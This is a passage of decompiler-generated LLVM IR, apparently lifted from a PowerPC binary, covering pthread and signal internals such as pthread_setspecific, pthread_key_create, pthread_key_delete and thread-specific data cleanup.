  %stack_var_-768 = alloca i32, align 4
  %stack_var_-900 = alloca i32, align 4
  %v0_10017a64 = load i32, i32* @lr, align 4
  store i32 %v0_10017a64, i32* %r0.global-to-local, align 4
  %v2_10017a6c = ptrtoint i32* %stack_var_-900 to i32
  store i32 %arg1, i32* @r31, align 4
  store i32 %v2_10017a6c, i32* @r3, align 4
  %v0_10017a80 = load i32, i32* @r2, align 4
  store i32 268532360, i32* @lr, align 4
  %v1_10017a84 = call i32 @sigfillset(i32 %v2_10017a6c)
  store i32 %v2_10017a6c, i32* @r3, align 4
  store i32 1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10017a9c.1104 to i32), i32* @lr, align 4
  %v1_10017a98 = call i32 @__GI_sigdelset(i32 %v2_10017a6c)
  %v0_10017b301 = load i32, i32* @r29, align 4
  %v0_10017b386 = load i32, i32* @r31, align 4
  store i32 %v0_10017b386, i32* @r3, align 4
  %tmp22 = icmp slt i32 %v0_10017b301, 66
  br i1 %tmp22, label %dec_label_pc_10017aa0.lr.ph, label %dec_label_pc_10017b40

dec_label_pc_10017aa0.lr.ph:                      ; preds = %entry
  %v2_10017af8 = ptrtoint i32* %stack_var_-768 to i32
  br label %dec_label_pc_10017aa0

dec_label_pc_10017aa0:                            ; preds = %dec_label_pc_10017aa0.lr.ph, %dec_label_pc_10017b2c
  %v0_10017b3810 = phi i32 [ %v0_10017b386, %dec_label_pc_10017aa0.lr.ph ], [ %v0_10017b38, %dec_label_pc_10017b2c ]
  %v0_10017b349 = phi i32 [ %v0_10017b301, %dec_label_pc_10017aa0.lr.ph ], [ %v1_10017b2c, %dec_label_pc_10017b2c ]
  store i32 268532388, i32* @lr, align 4
  %v2_10017aa0 = call i32 @sigismember(i32 %v0_10017b3810, i32 %v0_10017b349)
  %v3_10017aa4 = icmp eq i32 %v2_10017aa0, 0
  br i1 %v3_10017aa4, label %dec_label_pc_10017b2c, label %dec_label_pc_10017aac

dec_label_pc_10017aac:                            ; preds = %dec_label_pc_10017aa0
  %v3_10017ab0 = load i32, i32* @global_var_10045104.982, align 4
  store i32 %v3_10017ab0, i32* %r0.global-to-local, align 4
  %v0_10017ab4 = load i32, i32* @r29, align 4
  %v4_10017ab4 = icmp eq i32 %v0_10017ab4, %v3_10017ab0
  br i1 %v4_10017ab4, label %dec_label_pc_10017b2c, label %dec_label_pc_10017abc

dec_label_pc_10017abc:                            ; preds = %dec_label_pc_10017aac
  %v3_10017ac0 = load i32, i32* @global_var_10045108.994, align 4
  store i32 %v3_10017ac0, i32* %r0.global-to-local, align 4
  %v4_10017ac4 = icmp eq i32 %v0_10017ab4, %v3_10017ac0
  br i1 %v4_10017ac4, label %dec_label_pc_10017b2c, label %dec_label_pc_10017acc

dec_label_pc_10017acc:                            ; preds = %dec_label_pc_10017abc
  %v3_10017ad4 = load i32, i32* @global_var_1004510c.995, align 4
  store i32 %v3_10017ad4, i32* %r0.global-to-local, align 4
  store i32 %v2_10017a6c, i32* @r3, align 4
  %v4_10017adc = icmp eq i32 %v0_10017ab4, %v3_10017ad4
  br i1 %v4_10017adc, label %dec_label_pc_10017b2c, label %dec_label_pc_10017ae4

dec_label_pc_10017ae4:                            ; preds = %dec_label_pc_10017acc
  store i32 268532456, i32* @lr, align 4
  %v1_10017ae4 = call i32 @__GI_sigdelset(i32 %v2_10017a6c)
  %v0_10017aec = load i32, i32* @r29, align 4
  %v1_10017aec = mul i32 %v0_10017aec, 4
  store i32 %v1_10017aec, i32* %r0.global-to-local, align 4
  %v2_10017af4 = add i32 %v1_10017aec, ptrtoint (i32* @global_var_10049710.1102 to i32)
  %v3_10017af4 = inttoptr i32 %v2_10017af4 to i32*
  %v4_10017af4 = load i32, i32* %v3_10017af4, align 4
  store i32 %v4_10017af4, i32* %r0.global-to-local, align 4
  store i32 %v2_10017af8, i32* @r3, align 4
  %v2_10017afc = icmp ugt i32 %v4_10017af4, 1
  br i1 %v2_10017afc, label %dec_label_pc_10017b2c, label %dec_label_pc_10017b04

dec_label_pc_10017b04:                            ; preds = %dec_label_pc_10017ae4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 30420), i32* %stack_var_-772, align 4
  store i32 268532500, i32* @lr, align 4
  %v1_10017b10 = call i32 @sigemptyset(i32 %v2_10017af8)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10017b1c = load i32, i32* @r29, align 4
  store i32 268532524, i32* @lr, align 4
  %v4_10017b28 = call i32 @__GI_sigaction(i32 %v0_10017b1c, i32* nonnull %stack_var_-772, i32 0)
  br label %dec_label_pc_10017b2c

dec_label_pc_10017b2c:                            ; preds = %dec_label_pc_10017ae4, %dec_label_pc_10017acc, %dec_label_pc_10017abc, %dec_label_pc_10017aac, %dec_label_pc_10017aa0, %dec_label_pc_10017b04
  %v0_10017b2c = load i32, i32* @r29, align 4
  %v1_10017b2c = add i32 %v0_10017b2c, 1
  store i32 %v1_10017b2c, i32* @r29, align 4
  %v0_10017b38 = load i32, i32* @r31, align 4
  store i32 %v0_10017b38, i32* @r3, align 4
  %tmp23 = icmp slt i32 %v1_10017b2c, 66
  br i1 %tmp23, label %dec_label_pc_10017aa0, label %dec_label_pc_10017b40

dec_label_pc_10017b40:                            ; preds = %dec_label_pc_10017b2c, %entry
  %v2_10017b40 = ptrtoint i32* %stack_var_-624 to i32
  store i32 1, i32* @r4, align 4
  store i32 268532556, i32* @lr, align 4
  %v3_10017b48 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_10017b4c = icmp eq i32 %v3_10017b48, 0
  br i1 %v3_10017b4c, label %dec_label_pc_10017b54, label %dec_label_pc_10017b40.dec_label_pc_10017b9c_crit_edge

dec_label_pc_10017b40.dec_label_pc_10017b9c_crit_edge: ; preds = %dec_label_pc_10017b40
  %.pre = add i32 %v0_10017a80, 40
  %.pre11 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_10017b9c

dec_label_pc_10017b54:                            ; preds = %dec_label_pc_10017b40
  store i32 %v2_10017b40, i32* %r0.global-to-local, align 4
  %v2_10017b5c = add i32 %v0_10017a80, 40
  %v3_10017b5c = inttoptr i32 %v2_10017b5c to i32*
  store i32 %v2_10017b40, i32* %v3_10017b5c, align 4
  %v1_10017b64 = add i32 %v0_10017a80, 66
  %v2_10017b64 = inttoptr i32 %v1_10017b64 to i8*
  %v3_10017b64 = load i8, i8* %v2_10017b64, align 1
  %v4_10017b64 = zext i8 %v3_10017b64 to i32
  store i32 %v4_10017b64, i32* %r0.global-to-local, align 4
  %v3_10017b68 = icmp eq i8 %v3_10017b64, 0
  br i1 %v3_10017b68, label %dec_label_pc_10017b80, label %dec_label_pc_10017b70

dec_label_pc_10017b70:                            ; preds = %dec_label_pc_10017b54
  %v1_10017b74 = add i32 %v0_10017a80, 64
  %v2_10017b74 = inttoptr i32 %v1_10017b74 to i8*
  %v3_10017b74 = load i8, i8* %v2_10017b74, align 1
  %v4_10017b74 = zext i8 %v3_10017b74 to i32
  store i32 %v4_10017b74, i32* %r0.global-to-local, align 4
  %v3_10017b78 = icmp eq i8 %v3_10017b74, 0
  br i1 %v3_10017b78, label %dec_label_pc_10017b9c, label %dec_label_pc_10017b80

dec_label_pc_10017b80:                            ; preds = %dec_label_pc_10017b70, %dec_label_pc_10017b54
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10017b88 = add i32 %v0_10017a80, 32
  %v3_10017b88 = inttoptr i32 %v2_10017b88 to i32*
  store i32 0, i32* %v3_10017b88, align 4
  %v0_10017b94 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017b94 = trunc i32 %v0_10017b94 to i8
  %v3_10017b94 = add i32 %v0_10017a80, 88
  %v4_10017b94 = inttoptr i32 %v3_10017b94 to i8*
  store i8 %v1_10017b94, i8* %v4_10017b94, align 1
  store i32 268532636, i32* @lr, align 4
  %v1_10017b98 = call i32 @__libc_sigsuspend(i32 %v2_10017a6c)
  br label %dec_label_pc_10017b9c

dec_label_pc_10017b9c:                            ; preds = %dec_label_pc_10017b40.dec_label_pc_10017b9c_crit_edge, %dec_label_pc_10017b70, %dec_label_pc_10017b80
  %v3_10017ba4.pre-phi = phi i32* [ %.pre11, %dec_label_pc_10017b40.dec_label_pc_10017b9c_crit_edge ], [ %v3_10017b5c, %dec_label_pc_10017b70 ], [ %v3_10017b5c, %dec_label_pc_10017b80 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10017ba4.pre-phi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017bac.1105 to i32), i32* @lr, align 4
  %v1_10017ba8 = call i32 @pthread_testcancel(i32 %v0_10017a80)
  %v1_10017bb4 = add i32 %v0_10017a80, 32
  %v2_10017bb4 = inttoptr i32 %v1_10017bb4 to i32*
  %v3_10017bb4 = load i32, i32* %v2_10017bb4, align 4
  store i32 %v3_10017bb4, i32* %arg2, align 4
  store i32 %v0_10017a64, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10017b38, { 1, 0 }
  uselistorder i32 %v1_10017b2c, { 0, 2, 1 }
  uselistorder i32 %v1_10017aec, { 1, 0 }
  uselistorder i32 %v0_10017b301, { 1, 0 }
  uselistorder i32 %v0_10017a80, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %v2_10017a6c, { 2, 0, 3, 5, 4, 1, 6 }
  uselistorder i32 (i32)* @__libc_sigsuspend, { 1, 0 }
  uselistorder i32 (i32)* @sigemptyset, { 5, 2, 1, 0, 4, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_10049710.1102 to i32), { 0, 1, 2, 5, 3, 6, 4 }
  uselistorder i32 33, { 0, 2, 5, 1, 3, 4 }
  uselistorder i32 66, { 3, 0, 1, 4, 5, 12, 10, 6, 7, 13, 8, 9, 11, 2 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder label %dec_label_pc_10017b9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017b2c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10017aa0, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %v2_10017bd4 = icmp ugt i32 %arg1, 1023
  store i32 22, i32* @r10, align 4
  store i32 %arg2, i32* @r27, align 4
  %v0_10017bf8 = load i32, i32* @r2, align 4
  store i32 %v0_10017bf8, i32* @r28, align 4
  br i1 %v2_10017bd4, label %dec_label_pc_10017c64, label %dec_label_pc_10017c00

dec_label_pc_10017c00:                            ; preds = %entry
  %v1_10017bf4 = mul i32 %arg1, 8
  %v1_10017c00 = udiv i32 %arg1, 32
  store i32 %v1_10017c00, i32* @r29, align 4
  %v2_10017c18 = add i32 %v1_10017bf4, ptrtoint (i32* @global_var_10049814.1106 to i32)
  %v3_10017c18 = inttoptr i32 %v2_10017c18 to i32*
  %v4_10017c18 = load i32, i32* %v3_10017c18, align 4
  %v3_10017c1c = icmp eq i32 %v4_10017c18, 0
  br i1 %v3_10017c1c, label %dec_label_pc_10017c64, label %dec_label_pc_10017c24

dec_label_pc_10017c24:                            ; preds = %dec_label_pc_10017c00
  %v1_10017c04 = mul nuw nsw i32 %v1_10017c00, 4
  %v2_10017c08 = add i32 %v0_10017bf8, %v1_10017c04
  %v1_10017c24 = add i32 %v2_10017c08, 236
  %v2_10017c24 = inttoptr i32 %v1_10017c24 to i32*
  %v3_10017c24 = load i32, i32* %v2_10017c24, align 4
  %v3_10017c30 = icmp eq i32 %v3_10017c24, 0
  br i1 %v3_10017c30, label %dec_label_pc_10017c38, label %dec_label_pc_10017c4c

dec_label_pc_10017c38:                            ; preds = %dec_label_pc_10017c24
  store i32 ptrtoint ([3 x i8]* @global_var_10017c3c.1107 to i32), i32* @lr, align 4
  %v2_10017c38 = call i32 @calloc(i32 32, i32 4)
  store i32 12, i32* %r10.global-to-local, align 4
  %v3_10017c40 = icmp eq i32 %v2_10017c38, 0
  br i1 %v3_10017c40, label %dec_label_pc_10017c64, label %dec_label_pc_10017c48

dec_label_pc_10017c48:                            ; preds = %dec_label_pc_10017c38
  %v1_10017c48 = load i32, i32* @r30, align 4
  %v2_10017c48 = add i32 %v1_10017c48, 12
  %v3_10017c48 = inttoptr i32 %v2_10017c48 to i32*
  store i32 %v2_10017c38, i32* %v3_10017c48, align 4
  %v0_10017c4c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10017c4c

dec_label_pc_10017c4c:                            ; preds = %dec_label_pc_10017c24, %dec_label_pc_10017c48
  %v0_10017c4c = phi i32 [ %v1_10017c00, %dec_label_pc_10017c24 ], [ %v0_10017c4c.pre, %dec_label_pc_10017c48 ]
  %v1_10017c4c = mul i32 %v0_10017c4c, 4
  %v1_10017c50 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_10017c54 = load i32, i32* @r28, align 4
  %v2_10017c54 = add i32 %v1_10017c54, %v1_10017c4c
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10017c5c = add i32 %v2_10017c54, 236
  %v2_10017c5c = inttoptr i32 %v1_10017c5c to i32*
  %v3_10017c5c = load i32, i32* %v2_10017c5c, align 4
  %v0_10017c60 = load i32, i32* @r27, align 4
  %v3_10017c60 = add i32 %v3_10017c5c, %v1_10017c50
  %v4_10017c60 = inttoptr i32 %v3_10017c60 to i32*
  store i32 %v0_10017c60, i32* %v4_10017c60, align 4
  %v0_10017c68.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10017c64

dec_label_pc_10017c64:                            ; preds = %dec_label_pc_10017c38, %dec_label_pc_10017c00, %entry, %dec_label_pc_10017c4c
  %v0_10017c68 = phi i32 [ 12, %dec_label_pc_10017c38 ], [ 22, %dec_label_pc_10017c00 ], [ 22, %entry ], [ %v0_10017c68.pre, %dec_label_pc_10017c4c ]
  ret i32 %v0_10017c68

; uselistorder directives
  uselistorder i32 %v1_10017c00, { 2, 0, 1 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10017c64, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10017c4c, { 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10017cb0.lr.ph:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1004b814.1108 to i32), i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10017ca0.1109 to i32), i32* @lr, align 4
  %v1_10017c9c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b814.1108 to i32))
  store i32 %v1_10017c9c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_10049814.1106 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_10049814.1106 to i32), i32* @r10, align 4
  br label %dec_label_pc_10017cb0

dec_label_pc_10017cb0:                            ; preds = %dec_label_pc_10017cb0.lr.ph, %dec_label_pc_10017ce0
  %v0_10017cf4 = phi i32 [ 1024, %dec_label_pc_10017cb0.lr.ph ], [ %v1_10017cf4, %dec_label_pc_10017ce0 ]
  %v0_10017ce0 = phi i32 [ 0, %dec_label_pc_10017cb0.lr.ph ], [ %v1_10017ce0, %dec_label_pc_10017ce0 ]
  %v1_10017cc4 = phi i32 [ 0, %dec_label_pc_10017cb0.lr.ph ], [ %v1_10017ce8, %dec_label_pc_10017ce0 ]
  %v2_10017cb0 = add i32 %v1_10017cc4, ptrtoint (i32* @global_var_10049814.1106 to i32)
  %v3_10017cb0 = inttoptr i32 %v2_10017cb0 to i32*
  %v4_10017cb0 = load i32, i32* %v3_10017cb0, align 4
  %v3_10017cb4 = icmp eq i32 %v4_10017cb0, 0
  br i1 %v3_10017cb4, label %dec_label_pc_10017cbc, label %dec_label_pc_10017ce0

dec_label_pc_10017cbc:                            ; preds = %dec_label_pc_10017cb0
  store i32 1, i32* %v3_10017cb0, align 4
  store i32 ptrtoint (i32* @global_var_1004b814.1108 to i32), i32* @r3, align 4
  %v0_10017ccc = load i32, i32* @r30, align 4
  %v1_10017ccc = load i32, i32* @r10, align 4
  %v2_10017ccc = add i32 %v1_10017ccc, 4
  %v3_10017ccc = inttoptr i32 %v2_10017ccc to i32*
  store i32 %v0_10017ccc, i32* %v3_10017ccc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017cd4.1111 to i32), i32* @lr, align 4
  %v0_10017cd0 = call i32 @pthread_mutex_unlock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10017cd8 = load i32, i32* @r31, align 4
  %v1_10017cd8 = load i32, i32* @r29, align 4
  %v2_10017cd8 = inttoptr i32 %v1_10017cd8 to i32*
  store i32 %v0_10017cd8, i32* %v2_10017cd8, align 4
  %v0_10017d18.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10017d08

dec_label_pc_10017ce0:                            ; preds = %dec_label_pc_10017cb0
  %v1_10017ce0 = add nuw nsw i32 %v0_10017ce0, 1
  store i32 %v1_10017ce0, i32* @r31, align 4
  %v1_10017ce8 = mul i32 %v1_10017ce0, 8
  store i32 %v1_10017ce8, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_10049814.1106 to i32), i32* @r9, align 4
  %v2_10017cf0 = add i32 %v1_10017ce8, ptrtoint (i32* @global_var_10049814.1106 to i32)
  store i32 %v2_10017cf0, i32* @r10, align 4
  %v1_10017cf4 = add nsw i32 %v0_10017cf4, -1
  %v2_10017cf4 = icmp eq i32 %v1_10017cf4, 0
  br i1 %v2_10017cf4, label %dec_label_pc_10017cf8, label %dec_label_pc_10017cb0

dec_label_pc_10017cf8:                            ; preds = %dec_label_pc_10017ce0
  store i32 ptrtoint (i32* @global_var_1004b814.1108 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017d04.1112 to i32), i32* @lr, align 4
  %v0_10017d00 = call i32 @pthread_mutex_unlock()
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10017d08

dec_label_pc_10017d08:                            ; preds = %dec_label_pc_10017cbc, %dec_label_pc_10017cf8
  %v0_10017d18 = phi i32 [ %v0_10017d18.pre, %dec_label_pc_10017cbc ], [ 11, %dec_label_pc_10017cf8 ]
  ret i32 %v0_10017d18

; uselistorder directives
  uselistorder i32 %v1_10017cf4, { 1, 0 }
  uselistorder i32 %v1_10017ce8, { 1, 0, 2 }
  uselistorder i32 %v1_10017ce0, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_10017d08, { 1, 0 }
  uselistorder label %dec_label_pc_10017cb0, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10017d20 = load i32, i32* @lr, align 4
  store i32 %v0_10017d20, i32* %r0.global-to-local, align 4
  store i32 268763136, i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1004b814.1108 to i32), i32* @r30, align 4
  %v0_10017d3c = load i32, i32* @r2, align 4
  store i32 %v0_10017d3c, i32* @r29, align 4
  store i32 268533060, i32* @lr, align 4
  %v1_10017d40 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b814.1108 to i32))
  %v2_10017d44 = icmp ugt i32 %arg1, 1023
  br i1 %v2_10017d44, label %dec_label_pc_10017d68, label %dec_label_pc_10017d4c

dec_label_pc_10017d4c:                            ; preds = %entry
  store i32 268763136, i32* @r9, align 4
  %v1_10017d50 = mul i32 %arg1, 8
  store i32 %v1_10017d50, i32* @r11, align 4
  %v2_10017d58 = add i32 %v1_10017d50, ptrtoint (i32* @global_var_10049814.1106 to i32)
  %v3_10017d58 = inttoptr i32 %v2_10017d58 to i32*
  %v4_10017d58 = load i32, i32* %v3_10017d58, align 4
  store i32 %v4_10017d58, i32* %r0.global-to-local, align 4
  store i32 %v2_10017d58, i32* @r8, align 4
  %v3_10017d60 = icmp eq i32 %v4_10017d58, 0
  br i1 %v3_10017d60, label %dec_label_pc_10017d68, label %dec_label_pc_10017d78

dec_label_pc_10017d68:                            ; preds = %dec_label_pc_10017d4c, %entry
  %v0_10017d68 = load i32, i32* @r30, align 4
  store i32 %v0_10017d68, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017d70.1113 to i32), i32* @lr, align 4
  %v0_10017d6c = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10017ddc

dec_label_pc_10017d78:                            ; preds = %dec_label_pc_10017d4c
  %v3_10017d7c = load i32, i32* @global_var_100450e4.985, align 4
  store i32 %v3_10017d7c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r9, align 4
  store i32 0, i32* %v3_10017d58, align 4
  %v0_10017d88 = load i32, i32* %r0.global-to-local, align 4
  %v3_10017d88 = icmp eq i32 %v0_10017d88, -1
  %v0_10017d8c = load i32, i32* @r9, align 4
  %v1_10017d8c = load i32, i32* @r8, align 4
  %v2_10017d8c = add i32 %v1_10017d8c, 4
  %v3_10017d8c = inttoptr i32 %v2_10017d8c to i32*
  store i32 %v0_10017d8c, i32* %v3_10017d8c, align 4
  br i1 %v3_10017d88, label %dec_label_pc_10017dcc, label %dec_label_pc_10017d94

dec_label_pc_10017d94:                            ; preds = %dec_label_pc_10017d78
  %v1_10017d94 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v0_10017d98 = load i32, i32* @r29, align 4
  store i32 %v0_10017d98, i32* @r9, align 4
  %v1_10017d9c = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  %v0_10017da0.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10017da0

dec_label_pc_10017da0:                            ; preds = %dec_label_pc_10017dc0, %dec_label_pc_10017d94
  %v0_10017da0 = phi i32 [ %v2_10017dc0, %dec_label_pc_10017dc0 ], [ %v0_10017da0.pre, %dec_label_pc_10017d94 ]
  %v1_10017da0 = add i32 %v0_10017da0, 44
  %v2_10017da0 = inttoptr i32 %v1_10017da0 to i8*
  %v3_10017da0 = load i8, i8* %v2_10017da0, align 1
  %v4_10017da0 = zext i8 %v3_10017da0 to i32
  store i32 %v4_10017da0, i32* %r0.global-to-local, align 4
  %v2_10017da4 = add i32 %v0_10017da0, %v1_10017d9c
  store i32 %v2_10017da4, i32* @r11, align 4
  %v3_10017da8 = icmp eq i8 %v3_10017da0, 0
  br i1 %v3_10017da8, label %dec_label_pc_10017db0, label %dec_label_pc_10017dc0

dec_label_pc_10017db0:                            ; preds = %dec_label_pc_10017da0
  %v1_10017db0 = add i32 %v2_10017da4, 236
  %v2_10017db0 = inttoptr i32 %v1_10017db0 to i32*
  %v3_10017db0 = load i32, i32* %v2_10017db0, align 4
  store i32 %v3_10017db0, i32* @r11, align 4
  %v3_10017db4 = icmp eq i32 %v3_10017db0, 0
  br i1 %v3_10017db4, label %dec_label_pc_10017dc0, label %dec_label_pc_10017dbc

dec_label_pc_10017dbc:                            ; preds = %dec_label_pc_10017db0
  %v3_10017dbc = add i32 %v3_10017db0, %v1_10017d94
  %v4_10017dbc = inttoptr i32 %v3_10017dbc to i32*
  store i32 %v4_10017da0, i32* %v4_10017dbc, align 4
  %v0_10017dc0.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10017dc0

dec_label_pc_10017dc0:                            ; preds = %dec_label_pc_10017da0, %dec_label_pc_10017db0, %dec_label_pc_10017dbc
  %v0_10017dc0 = phi i32 [ %v0_10017da0, %dec_label_pc_10017da0 ], [ %v0_10017da0, %dec_label_pc_10017db0 ], [ %v0_10017dc0.pre, %dec_label_pc_10017dbc ]
  %v1_10017dc0 = inttoptr i32 %v0_10017dc0 to i32*
  %v2_10017dc0 = load i32, i32* %v1_10017dc0, align 4
  store i32 %v2_10017dc0, i32* @r9, align 4
  %v1_10017dc4 = load i32, i32* @r29, align 4
  %v4_10017dc4 = icmp eq i32 %v2_10017dc0, %v1_10017dc4
  br i1 %v4_10017dc4, label %dec_label_pc_10017dcc, label %dec_label_pc_10017da0

dec_label_pc_10017dcc:                            ; preds = %dec_label_pc_10017dc0, %dec_label_pc_10017d78
  store i32 ptrtoint (i32* @global_var_1004b814.1108 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017dd8.1114 to i32), i32* @lr, align 4
  %v0_10017dd4 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10017ddc

dec_label_pc_10017ddc:                            ; preds = %dec_label_pc_10017d68, %dec_label_pc_10017dcc
  %storemerge = phi i32 [ 22, %dec_label_pc_10017d68 ], [ 0, %dec_label_pc_10017dcc ]
  store i32 %v0_10017d20, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10017dc0, { 1, 2, 0 }
  uselistorder i32 %v0_10017da0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10017d50, { 1, 0 }
  uselistorder i32* @global_var_100450e4.985, { 4, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20 }
  uselistorder i32 ptrtoint (i32* @global_var_1004b814.1108 to i32), { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10017ddc, { 1, 0 }
  uselistorder label %dec_label_pc_10017dc0, { 2, 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10017df0 = mul i32 %arg1, 4
  %v1_10017df4 = load i32, i32* @r2, align 4
  %v2_10017df4 = add i32 %v1_10017df0, 364
  %v1_10017df8 = add i32 %v2_10017df4, %v1_10017df4
  ret i32 %v1_10017df8
}

define i32 @__pthread_internal_tsd_get(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10017e00 = mul i32 %arg1, 4
  %v1_10017e04 = load i32, i32* @r2, align 4
  %v2_10017e04 = add i32 %v1_10017e04, %v1_10017e00
  %v1_10017e08 = add i32 %v2_10017e04, 364
  %v2_10017e08 = inttoptr i32 %v1_10017e08 to i32*
  %v3_10017e08 = load i32, i32* %v2_10017e08, align 4
  ret i32 %v3_10017e08
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10017e10 = mul i32 %arg1, 4
  %v1_10017e14 = load i32, i32* @r2, align 4
  %v2_10017e14 = add i32 %v1_10017e10, 364
  %v2_10017e18 = add i32 %v2_10017e14, %v1_10017e14
  %v3_10017e18 = inttoptr i32 %v2_10017e18 to i32*
  store i32 %arg2, i32* %v3_10017e18, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 0, 2, 1 }
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 1, i32* @r8, align 4
  %v0_10017e34 = load i32, i32* @r2, align 4
  store i32 %v0_10017e34, i32* @r29, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10017ed8

dec_label_pc_10017e44:                            ; preds = %dec_label_pc_10017ee0, %dec_label_pc_10017ec0
  %v0_10017ed0.pr16 = phi i32 [ 0, %dec_label_pc_10017ee0 ], [ %v0_10017ed0.pr, %dec_label_pc_10017ec0 ]
  %v1_10017e4c = phi i32 [ %v1_10017e4c3, %dec_label_pc_10017ee0 ], [ %v1_10017e4c4, %dec_label_pc_10017ec0 ]
  %v0_10017e44 = phi i32 [ 0, %dec_label_pc_10017ee0 ], [ %v1_10017ec0, %dec_label_pc_10017ec0 ]
  %v1_10017e44 = mul i32 %v0_10017e44, 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10017e4c = add i32 %v1_10017e44, %v1_10017e4c
  %v1_10017e50 = add i32 %v2_10017e4c, 236
  %v2_10017e50 = inttoptr i32 %v1_10017e50 to i32*
  %v3_10017e50 = load i32, i32* %v2_10017e50, align 4
  %v3_10017e54 = icmp eq i32 %v3_10017e50, 0
  br i1 %v3_10017e54, label %dec_label_pc_10017ec0, label %dec_label_pc_10017e90.outer

dec_label_pc_10017e60:                            ; preds = %dec_label_pc_10017e90
  %v2_10017e98 = add i32 %v1_10017e90, %v0_10017eb0
  %v1_10017ea0 = mul i32 %v2_10017e98, 8
  %v1_10017e60 = add i32 %v1_10017ea0, add (i32 ptrtoint (i32* @global_var_10049814.1106 to i32), i32 4)
  %v2_10017e60 = inttoptr i32 %v1_10017e60 to i32*
  %v3_10017e60 = load i32, i32* %v2_10017e60, align 4
  %v3_10017e68 = icmp eq i32 %v3_10017e60, 0
  br i1 %v3_10017e68, label %dec_label_pc_10017e90, label %dec_label_pc_10017e7c

dec_label_pc_10017e7c:                            ; preds = %dec_label_pc_10017e60
  %v3_10017e64 = load i32, i32* %v2_10017e64, align 4
  %v2_10017e6c = add i32 %v3_10017e64, %v1_10017eb0
  %v3_10017e6c = inttoptr i32 %v2_10017e6c to i32*
  store i32 0, i32* %v3_10017e6c, align 4
  call void @__pseudo_call(i32 %v3_10017e60)
  store i32 1, i32* @r8, align 4
